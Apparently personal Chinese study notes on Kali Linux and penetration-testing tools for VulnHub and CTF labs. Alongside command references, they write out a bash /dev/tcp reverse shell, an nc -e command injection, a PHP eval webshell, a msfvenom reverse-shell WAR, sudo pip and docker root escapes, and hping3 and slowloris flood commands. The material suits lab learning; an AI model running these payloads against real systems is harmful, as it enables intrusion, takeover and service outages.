---
title: "kali linux基操"
data: 2026-03-18
draft: false
weight: 1
---

# 一、kali linux基础
## 1.1 kali linux核心系统目录

| 绝对路径                 | 解释                                                       |
| ------------------------ | ---------------------------------------------------------- |
| /                        | 根目录                                                     |
| /bin                     | 存放系统启动和基础可执行命令                               |
| /sbin                    | 存放系统管理员专用的系统管理命令                           |
| /etc                     | 存放系统和应用程序的核心配置文件                           |
| /home                    | 普通用户家目录的父目录                                     |
| /root                    | root超级用户的专属家目录                                   |
| /usr                     | 存放用户应用程序、共享库和渗透测试工具                     |
| /var                     | 存放动态变化的文件（日志、缓存、数据库）                   |
| /opt                     | 大型第三方应用程序安装目录                                 |
| /tmp                     | 系统临时文件目录                                           |
| /dev                     | 硬盘设备映射文件目录                                       |
| /home/用户名/.ssh/id_rsa | RSA算法生成的私钥默认文件名                                |
| /var/www/html            | Linux系统中Apache或Nginx Web服务器存放网页文件的默认根目录 |

## 1.2 kali linux工具关键路径

|用途|绝对路径|
|--|--|
|常用渗透工具执行文件|/usr/bin/|
|自带爆破字典|/usr/share/wordlists/|
|RockyYou字典（压缩包）|/usr/share/wordlists/rockyou.txt.gz|
|Dirb常用字典|/usr/share/wordlists/dirb/common.txt|
|Metasploit框架目录|/usr/share/metasploit-framework/|
|Exploit-DB漏洞库目录|/usr/share/exploitdb/|
|APT软件源配置文件|/etc/apt/sources.list|
|SSH服务配置文件|/etc/ssh/sshd_config|

## 1.3 基础命令
| 命令                | 解释                                   |
|--|--|
|pwd|查看当前目录|
|hostname|查看主机名|
|ip a|查看网卡|
|cat /etc/os-release|查看系统版本|
|sudo -l|列出当前用户被允许以sudo身份执行的命令|
|sudo pip install .|以pip安装当前目录里的python包|

## 1.4 文件共享
先选择共享文件夹`share`

```zsh
# vmware tools自带工具，探测
vmware-hgfsclient

# 创建挂载点：/mnt是linux放临时挂载设备的目录，hgfs是vmware专用共享文件系统目录名，-p，如果hgfs不存在，那么一起创建
mkdir -p /mnt/hgfs/share

# 连接指令：-t是type，fuse.vmhgfs-fuse是vmware专用的格式，.host:/share是源地址，/mnt/hgfs/share是目的地址
mount -t fuse.vmhgfs-fuse .host:/share /mnt/hgfs/share
ls /mnt/hgfs/share
```
# 二、基础工具
## 2.1 nano/vim
📝 Linux 终端编辑器常用操作对照表

| 功能描述 | **Nano** (简单直观) | **Vim** (功能强大/模式化) |
| :--- | :--- | :--- |
| **打开/创建文件** | `nano <文件名>` | `vim <文件名>` |
| **进入编辑模式** | 直接输入 | 按 `i` (即 Insert 模式) |
| **退出编辑模式** | (无需退出) | 按 `Esc` 键 |
| **保存文件** | `Ctrl + O` 然后 `Enter` | (普通模式下) 输入 `:w` 然后 `Enter` |
| **退出编辑器** | `Ctrl + X` | (普通模式下) 输入 `:q` 然后 `Enter` |
| **强制退出 (不保存)** | `Ctrl + X` (若提示则按 `N`) | (普通模式下) 输入 `:q!` 然后 `Enter` |
| **保存并退出** | `Ctrl + O` 再 `Ctrl + X` | (普通模式下) 输入 `:wq` 或 `ZZ` |
| **搜索文本** | `Ctrl + W` | (普通模式下) 输入 `/关键词` |
| **翻页 (上/下)** | `Ctrl + Y` / `Ctrl + V` | `Ctrl + B` / `Ctrl + F` |
| **跳转到行首/行尾** | `Ctrl + A` / `Ctrl + E` | `0` (数字零) / `$` |
| **删除整行** | `Ctrl + K` (相当于剪切) | `dd` |
| **撤销操作** | `Alt + U` | `u` |
| **帮助菜单** | `Ctrl + G` | `:help` |
| **粘贴**（外部） | `Ctrl + Shift + V`或鼠标右键 |  |
| **粘贴**（内部） | `Ctrl + U`（U代表Uncut） |  |
| **剪切一整行** | `Ctrl + K`（K代表Cut） |  |

---
**💡 使用提示：**

1. **Nano：** 界面下方的 `^` 符号代表键盘上的 `Ctrl` 键。
2. **Vim：** 如果你在 Vim 中按键没反应或“乱跑”，连按几次 `Esc` 回到普通模式即可重新输入命令。
3. **权限：** 修改系统文件（如 `/etc/hosts`）请务必在命令前加 `sudo`。

## 2.2 find
`find / -perm -4000 -type f 2>/dev/null`
  `/`指定查找的起始路径，这里是根目录，代表全盘搜索
  `-perm`代表按权限过滤，`-4000`代表SUID(Set User ID)位
  `-type f`指定只查找文件，忽略文件夹或快捷方式
  `2>/dev/null`错误屏蔽（标准错误流2重定向到黑洞设备/dev/null）


`find / -perm -u=s -type f 2>/dev/null`
  `-u=s`，`u`代表user，`s`代表SUID（Set User ID）位

`find /usr/ -name *webbrowser*`
  在`/usr/`文件起始，寻找文件名包含`webbrowser`的文件，`*`是通配符，代表任何字符

`find / -name "*flag*"`

`find / -group administrators 2>/dev/null`
  查找系统中所有属于`administrators`用户组的文件或目录

## 2.3 ssh
`ssh 用户名@ip地址`

## 2.4 strings
面对一个编译后的二进制可执行文件
`strings 此文件`

## 2.5 vim
保存并退出：按`Esc`键，再输入`:wq`回车
不保存并退出：按`Esc`键，再输入`:q!`回车

## 2.6 gcc
`gcc 45010.c -o exp1`
gcc是linux下的c语言编译器，`-o`是output，将此`.c`源文件编译后命名为`exp1`

## 2.7 chmod(change mode)
`chmod +x 文件名`，允许该文件作为一个程序被运行
`chmod 777 文件名`，所有人都能读、写、执行
`chmod u+s reset_root`，让程序执行时具有所有者的身份

## 2.8 SSH
`ssh 用户名@ip` → 指纹确认 → 输入密码
ssh相比反弹shell更稳定，ssh流量加密

## 2.9 ls

`ls`仅仅看目录下文件，而`ls -l`（`-l`代表long），能显示文件的7个关键属性

例如：`-rw-rw-r-- 1 adrian administrators 481 Oct 30 2021 query.py`

|权限位|链接数|所有者|所属组|大小|修改日期|文件名|
|-----|-----|-----|-----|----|-------|-----|
|-rw-rw-r--|1(节点引用)|adrian|administrators|481字节|oct 30 2021|query.py|

## 2.10 su
`su [用户名]`切换到指定用户（保留当前的环境变量）
`su - [用户名]`切换用户，且完全加载目标用户的环境
# 三、渗透工具
## 3.1 arp-scan
`sudo arp-scan -l`

## 3.2 nmap端口扫描
例如
```ZSH
sudo nmap -A ip地址 # 全面的系统探测
sudo nmap -A -p 1-65535 ip地址 # 全端口的深度探测
sudo nmap -sS -p 1-65535 --min-rate 5000 ip地址 -oN ports.txt # 高速全端口扫描
sudo nmap -sS -Pn -p- -T4 192.168.242.94
sudo nmap -sS -sV -sC -T4 192.168.203.131
```

- 扫描类型与深度
|参数|全称|什么时候用|
|--|--|--|
|`-sS`|TCP SYN Scan|**默认必选**。半开放扫描，速度快且隐蔽，不会完成TCP三次握手|
|`-sV`|Version Detection|**查版本**。探测端口上运行的具体软件及其版本号|
|`-sC`/`--script=default`|Default Script Scan|**找漏洞**。使用Nmap官方默认脚本检查基础配置错误或已知漏洞|
|`-O`|OS Detection|**猜系统**。通过TCP/IP协议栈指纹识别目标是Linux,Windows还是嵌入式设备|
|`-A`|Aggressive Mode|**全能模式**。相当于同时开启了`-sV`,`-sC`,`-O`和`--traceroute`|

- 目标范围与存活判定
|参数|全称|什么时候用|
|--|--|--|
|`-p-`|All Ports|**全端口扫描**。扫描1到65535所有端口。默认只扫描1000个常用端口|
|`-Pn`|No Ping|**对方禁ping时**。绕过ICMP探测，强制直接进行端口扫描|
|`--traceroute`|Traceroute|**拓扑分析**。追踪数据包到目标的路径，分析中间经过了多少层路由/防火墙|

- 性能与时间控制
|参数|全称|什么时候用|
|--|--|--|
|`-T4`|Timing Template|**提高速度**。0-5级，T4是兼具速度与稳定性的推荐值。T5极快但容易被封|
|`--min-rate [num]`|Minimum Rate|**硬件限速**。比如`--min-rate 1000`保证每秒发包不少于1000个，极大缩短全端口扫描时间|

- 结果输出
|参数|全称|什么时候用|
|--|--|--|
|`-oN ports.txt`|Normal Output|**存为文本**。扫描结果保存为txt文件，方便后续查看或grep过滤|

- 常见场景

场景A：快速资产摸底（在已知网络环境下快速确定服务）
`sudo nmap -sS -sV -sC -T4 目标ip`

场景B：全量深度扫描（CTF/内网渗透）（扫描所有端口，且尝试获取操作系统指纹和默认脚本漏洞）
`sudo nmap -p- -A --min-rate 1000 -oN scan_report.txt 目标ip`

场景C：穿透防火墙（对方不回ping）（强制探测，且放慢速度避免被IDS拦截）
`sudo nmap -Pn -sS -p 80,443,22,3389 目标ip`


## 3.3 searchsploit
`uname -a`查看内核版本
`lsb_release -a`查看发行版本
`searchsploit vsFTPd 3.0.3 -w`，扫描vsFTPd这个软件，版本号为3.0.3的有没有漏洞，`-w`是显示完整标题，或`--overflow`，不看URL，只强行展示长标题
`searchsploit -m 45010`将45010编号的文件拷贝到当前文件夹(-m是mirror)
## 3.4 HTTP扫描

### 3.4.1 curl
`curl http://192.168.174.129/site/busque.php?buscar=id`
将kali终端当作简易浏览器，向服务器请求`busque.php`这个页面，并传递参数`buscar=id`，最终在终端打印出该页面的HTML源代码

### 3.4.2 nikto服务器扫描
`nikto -h http://192.168.174.129`
nikto是web服务器扫描器，`-h`(`-host`)指定要扫描的目标主机，发现已知漏洞和配置缺陷，基于指纹库

### 3.4.3 dirb目录扫描(乱)
`dirb http://192.168.174.129`
发现隐藏的目录和文件，基于字典

### 3.4.4 wpscan
`wpscan --url http://192.168.174.129/site/wordpress -e u,p`
wpscan是专门用于扫描wordpress网站的漏洞和敏感信息，`-e`(`--enumerate`)是枚举，`u,p`代表枚举用户和插件
`/wp-admin/`管理后台登陆地址，`/wp-content/`存放所有用户上传的内容，`/wp-includes/`包含JS、CSS、PHP函数库（核心库文件）
`wp-config.php`包含数据库账号密码，`xmlrpc.php`常被利用进行暴力破解或DDoS攻击，`readme.html`通常泄露WordPress的具体版本号
`wp-json/wp/v2/users`是REST API，常被用来枚举系统用户名

### 3.4.5 gobuster目录扫描(更强go语言编写)
`gobuster dir -u http://目标ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,js,sh,txt,bak,zip,sql,old,env -o scan_result.txt` 
gobuster是比dirb更强大的目录枚举工具(go语言编写)，dir使用目录模式，-u(--url)，-w(--wordlist)，-t(--threads)代表线程数，-x(--extensions)指定要搜索的文件扩展名，-o(output)结果保存到该文件，方便后续用`grep`过滤分析，-k(--insecure)忽视证书问题
例如字典里的一个词是`admin`，那么gobuster会同时探测
`http://目标ip/admin`
`http://目标ip/admin.php`
`http://目标ip/admin.html`
`http://目标ip/admin.js`......等等

推荐的字典：`/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

同时有的目录是`/~secret`形式的，此时需要新的参数
`gobuster fuzz -u http://目标ip/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`，这样gobuster会把字典里的每个词替换到`FUZZ`位置，请求的路径会变成
`http://目标ip/~secret`

### 3.4.6 dirsearch（打ctf用）

`dirsearch -u http://目标 -e php,bak,zip`

### 3.4.7 fuff(模糊目录扫描)
`ffuf -u "http://192.168.174.132/~secret/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .txt,.php,bak,html -mc 200`
`-mc`(match http code)指定只显示200(成功)的页面

## 3.5 Base64解码
`echo "Base64编码" | base64 -d`

## 3.6 爆破
### 3.6.1 Hydra
`username.txt`存放收集到的所有可能的的用户名（每行一个）
`passwd.txt`存放收集到的所有可能的密码（每行一个）
接着会进行一一对应的尝试
```ZSH
hydra -L username.txt -P passwd.txt -s 目标端口 目标ip http-get(协议模块) 认证目标路径
```

## 3.7 netcat
`nc -lvvp 443`
`-l`开始监听模式，`-v`(verbose)显示详细信息，`-vv`则显示更详细的连接状态，`-n`不用DNS解析，加快速度，防止因DNS延迟导致连接断开，`-p`指定端口

## 3.8 SSH私钥密码破解
`python3 /usr/share/john/ssh2john.py /home/kali/Desktop/vulnhub/upfine > passwd`
`ssh2john.py`是John自带的转换脚本，把SSH私钥文件转换成John能识别的哈希格式
`> passwd`将转换后的哈希内容写进`passwd`，（输出重定向）

`john --wordlist=/usr/share/wordlists/fasttrack.txt passwd`
用`fasttrack.txt`字典破解`passwd`里的哈希，获得SSH私钥的密码

输出类似：`secret123 (upfine)`

成功后赋予upfine文件600权限`chmod 600 upfine`
第一个`6`是拥有者，权限是`4+2`，即`读+写`
第二个`0`是组用户，无权限
第三个`0`是其他人，无权限
这一步是由于，私钥文件不能被别人读取，如果权限太开放（如`644`），ssh会拒绝使用私钥文件

再用`ssh -i upfine user@target`直接登录（`-i`是identity file）

## 3.9 隐写术工具
### 3.9.1 steghide
`sudo apt install steghide -y`
`steghide info [图片/音频]`
提取:`steghide extract -sf [图片/音频]`
隐藏:`steghide embed -cf [图片/音频] -ef [要隐藏的文件]`

## 3.10 metasploit-framework
### 3.10.1密码爆破例子
```
msfconsole
search tomcat login
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 靶机IP
exploit
```

## 3.11 Dos攻击
### 3.11.1 DDos攻击
**Tcp syn DDos攻击**

```ZSH
hping3 -S -c 30000 -d [发送数据包大小，如120] -i [发送数据包间隔，如u1000] -p [指定端口] [指定IP]
```
  - `-a`伪造IP攻击IP
  - `--rand-dest`随机目的地址模式
  - `--rand-source`随机源地址模式
  - `-i u1000`代表1000μs发一个包，即0.001s发一个包，即每秒发1000个包
  - `1s` = `1000ms`；`1ms` = `1000μs`
  - 将发包间隔部分替换成`--flood`尽最快发送数据包，不显示回复

**UDP DDos攻击**

```ZSH
hping3 --udp -c 30000 -d [发送数据包大小] -i [发送数据包间隔] -p [指定端口] [指定IP]
```

**ICMP DDos攻击**
```ZSH
hping3 --icmp -c 30000 -d [发送数据包大小] -i [发送数据包间隔] -p [指定端口] [指定IP]
```

**计算攻击带宽**
  - $$\text{带宽 (bps)} = \text{每秒发包数 (PPS)} \times \text{单个数据包总大小 (Bytes)} \times 8 \text{ (bits/byte)}$$
  - $PPS = \frac{1,000,000 \text{ 微秒}}{\text{间隔 } u}$
  - > 总大小 (S) = 报头大小 + `-d` 指定的大小
    - ICMP 攻击：IP 报头 (20B) + ICMP 报头 (8B) = 28 字节
    - UDP 攻击：IP 报头 (20B) + UDP 报头 (8B) = 28 字节
    - TCP SYN 攻击：IP 报头 (20B) + TCP 报头 (20B) = 40 字节

**假设**命令为：`hping3 -S -p 8080 -d 120 -i u100 [IP]`
  1. PPS：$1,000,000 / 100 = 10,000 \text{ pps}$
  2. 包大小(S)：TCP 报头 (40B) + 负载 (120B) = $160 \text{ Bytes}$
  3. 计算带宽：$10,000 \text{ pps} \times 160 \text{ Bytes} \times 8 \text{ bits/byte} = 12,800,000 \text{ bps}$
  4. 结果：约12.8Mbps

### 3.11.2 HTTP Dos慢速连接攻击
```ZSH
slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://[指定IP]:[指定端口] -x 10 -p 3
```
  - `-B`在消息正文中放慢速度
  - `-g -o`生成csv格式的统计信息，并指定生成`my_body_stats`文件
  - `-i`为连接数据间的间隔为多少秒
  - `-r`为每秒多少个连接
  - `-s`，若有`-B`，则为Content-Length标头的值
  - `-t`要使用的自定义动词
  - `-x`为随访数据的最大长度
  - `-p`秒，为等待探针连接上的HTTP响应超时，之后服务器被视为不可访问

### 3.11.3不完整的HTTP请求Dos攻击
```ZSH
slowloris [指定IP] -p [指定端口] -s 1000
```
  - `-s`指定连接数
# 四、Payload分析
## 4.1 反弹shell
### 4.1.1 bash反弹
```ZSH
bash -i >& /dev/tcp/攻击机IP/7777 0>&1
```
  - `-i`启动交互式（interactive）的Bash窗口，确保连接成功后，能像在本地终端一样输入命令，并能看到提示符和错误信息
  - `>&`是合并重定向符号，将标准输出和标准错误都发送到后面的网络连接中
  - `/dev/tcp/攻击机IP/PORT`是Bash的特殊功能，会与指定ip端口建立一个TCP网络连接
  - `0>&1`是重定向输入，将**标准输入(stdin/0)**重定向到**标准输出(1)**指向的地方
深入理解：`0>&1`：`0`(stdin)标准输入(键盘)，`1`(stdout)标准输出(屏幕)，`2`(stderr)标准错误(屏幕)
  - 逻辑链：`>& /dev/tcp/...`把输出`1`定向到了网络套接字(socket)，此时屏幕不显示输出，输出都去了远程服务器，接着`0>&1`把输入`0`定向到了`1`所在的地方，因为`1`现在连接着网络套接字，所以`0`也连上了网络套接字。
  - 仅`bash -i >& /dev/tcp`：键盘→Bash→远程屏幕
  - 加上`0>&1`：远程键盘→Bash→远程屏幕

这里需要kali先监听`7777`端口

### 4.1.2 反弹shell URL版本
```ZSH
http://攻击机IP/site/busque.php?buscar=nc%20-e%20/bin/bash%20靶机IP%205555
nc -lvnp 5555
```
  - `-e /bin/bash`告诉netcat一旦连接成功，就运行系统的bash shell
  - `%20`是空格的URL编码，因为浏览器orHTTP请求的URL中不能直接包含空格
  - `nc -e /bin/bash 192.168.174.131 5555`是正常空格的命令

### 4.1.3 一句话木马传入`shell.php`
```ZSH
http://靶机ip/site/busque.php?buscar=echo '<?php eval($_POST["cmd"]); ?>' > shell.php
```
  - 这里的`/site/busque.php?buscar=`是靶机网站自带的
  - `<?php ... ?>`是php代码开始和结束标记
  - `$_POST["cmd"]`是超级全局变量，用于接收通过HTTP POST方法传递过来的数据，参数名为`cmd`
  - `eval()`函数，作用是把字符串当作PHP代码执行
  - 最后的`>`作用是，把前面的内容存进`shell.php`文件
  - 一旦`shell.php`写入服务器，可以向此文件发送任何PHP代码，服务器都会毫不犹豫地通过`eval()`执行它

### 4.1.4 python反弹shell
```python
import os
os.system("/bin/bash")
```
调用python的`os`模块，再调用系统命令`/bin/bash`开一个新的shell，`/bin/bash`本身不会提权，提权的是执行它的用户身份

### 4.1.5 msfvenom生成包含反弹shell的war文件
```ZSH
msfvenom -p java/shell_reverse_tcp LHOST=<你的IP> LPORT=<你的端口> -f war > shell.war
```
## 4.2 交互式root shell绑定(本地提权)
```ZSH
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > setup.py
sudo pip install .
```
  - 整体分析：`echo "import os; os.execl(...)" > setup.py`本来是要把这段python代码打印出来，由于`> setup.py`，则把内容写进(重定向)到`setup.py`文件，最后用pip安装`setup.py`文件
  - os.execl理解：`os.execl()`是用新程序(`/bin/sh`)替换当前进程(`pip`)，即pip进行→变成root shell
  - 参数理解：`'/bin/sh'`要执行的程序，`'sh'`程序名，`'-c'`执行后面的命令，` 'sh <$(tty) >$(tty) 2>$(tty)'`重定向输入输出
  - `sh和-c`参数理解：`os.execl(程序路径, 程序名, 参数1, 参数2,...)`这是`os.execl()`函数的规范，因此拆解为自然语言则是，运行`/bin/sh`，程序名为`sh`，使用`-c`参数，执行后面那段命令字符串(即`sh <$(tty) >$(tty) 2>$(tty)`)
  - 长参数理解：`sh <$(tty) >$(tty) 2>$(tty)`是让shell正确绑定当前终端，`<$(tty)`把输入连接到当前终端，`>$(tty)`把输出连接到当前终端，`2>$(tty)`把错误输出连接到当前终端

交互式root shell绑定思路：
```bash
arsene shell
   ↓
sudo pip (root)
   ↓
setup.py 执行
   ↓
root shell 接管当前终端
```

反弹shell思路对比：
```bash
攻击机监听
   ↓
目标机执行反弹代码
   ↓
目标机连接攻击机
   ↓
攻击机获得 shell
```

## 4.3 升级shell界面
1. 靶机上：`python3 -c 'import pty; pty.spawn("/bin/bash")'` (获得基础交互)。
2. 键盘按：`Ctrl + Z` (将 Shell 丢入后台)。
3. Kali 上：`stty raw -echo; fg` (接管输入流并带回前台)。
4. 靶机上：`reset` (刷新显示)。
5. 靶机上：`export TERM=xterm` (开启完整显示支持)。

  - `stty raw`进入原始模式，所有键盘输入(ctrl+c,tab)都不由本地系统处理，而是直接通过网络发送
  - `-echo`禁止本地回显，不然输入字符，本地显示一次，远程传回字符显示一次
  - `; fg`把挂起的反弹shell切回前台

# 五、权限
## 5.1 权限划分
Root权限(UID 0)：最高权限
普通用户(UID 1000+)：如`jangow01`
服务账户(UID < 1000)：如`www-data`

## 5.2 三位数字
位数：第1位是拥有者，第2位是组用户，第3位是其他人

4 = 读
2 = 写
1 = 执行

|数字|英文|含义|
|:-:|:-:|---|
|777|-rwxrwxrwx|所有人可读写执行（危险）|
|755||拥有者全权限，别人可读执行|
|644||拥有者读写，别人只读|
|600||拥有者可读写（私钥专用）|

# 六、vulnhub靶场
## 6.1修复适配vmware
### 6.1.1 修改启动参数进入单用户模式
启动靶机，在第一个界面加载完成，迅速单击`shift`进入GRUB菜单，接着`e`进入编辑模式，将`ro`（只读）修改为`rw`（读写），并参数末尾修改为`single init=/bin/bash`（直接启动到Bash环境，跳过密码验证），按`Ctrl + X`启动
（ps：若启动太快，则在`.vmx`文件最后一行添加`bios.bootDelay = "5000"`，或者虚拟机→电源→打开电源时进入固件）
（ps：若键盘映射问题，无法输入`:wq`，那么按住`shift`，再双击`z`，保存并退出vim）

### 6.1.2 修改网卡配置
输入`ip a`查看当前网卡名称，`vim /etc/network/interfaces`，将其中的名字修改为`ens33`，但若发现不存在该文件，这种情况是因为`netplan`软件接管了网卡管理，进入`/etc/netplan`文件夹，再进入`00-netplan.yaml`类似的配置文件，进入用`i`修改网络接口名称，再按`Esc`键，输入`:wq`保存退出

## 6.2 vulnhub打靶思路
### 6.2.1 总体
1. 端口全扫 → 服务版本
2. 看网页、目录扫描
3. 找已知漏洞CVE
4. 拿shell
5. 提权（内核、sudo、SUID、定时任务、密码泄露）

### 6.2.2 提权思路
核心逻辑：寻找配置错误、过度授权或已知漏洞，跨越权限边界

1. 基础信息搜集命令
    - 用户身份：`whoami`和`id`，查看所属用户组，如`docker`、`lxd`、`sudo`组常有特殊提权思路
    - 内核版本：`uname -a`或`cat /etc/issue`或`lsb_release -a`，检查是否有DirtyPipe、DirtyCow等内核漏洞
    - 网络状态：`netstat -antp`，查看是否有仅监听`127.0.0.1`的内部服务
2. sudo权限分析
    - 原理：检查当前用户是否可以无需密码，或使用已知密码运行root权限命令
    - 命令：`sudo -l`
    - 可利用工具*GTFOBins*
3. SUID权限文件（权限借用）
    - 原理：SUID位允许普通用户以文件所有者(通常root)的身份运行程序
    - 命令：`find / -perm -u=s -type f 2>/dev/null`（见**2.2find**）
4. 计划任务与可写脚本（借刀杀人）
    - 提权逻辑：
      1. 寻找以root身份运行的任务
      2. 检查该任务调用的*脚本或二进制文件*是否有写权限
      3. 若有，往脚本注入反弹shell代码：`bash -i >& /dev/tcp/我的ip/端口 0>&1`
      4. 等待cron周期自动触发，就能在`nc`端收到root shell
    - 查看任务命令：`cat /etc/crontab`或`ls -la /etc/cron.*`
5. 敏感文件与配置泄露（顺藤摸瓜）
    - 配置文件：检查Web根目录下的数据连接文件（如`/var/www/html`下的数据库连接文件`config.php`等），里面是否有root数据库密码或复用的系统密码
    - 备份文件：搜索`.bak`、`.sql`、`.zip`等备份
    - SSH密钥：检查`/home/user/.ssh/id_rsa`是否可读，或有无其他用户的私钥遗留
6. 现代容器/环境提权（我不理解）
    - Docker组：如果在`docker`组，可以运行`docker run -v /:/mnt --rm -it alpine chroot /mnt`直接挂载整个物理根目录
    - LXD组：通过挂载镜像的方式获取物理机root权限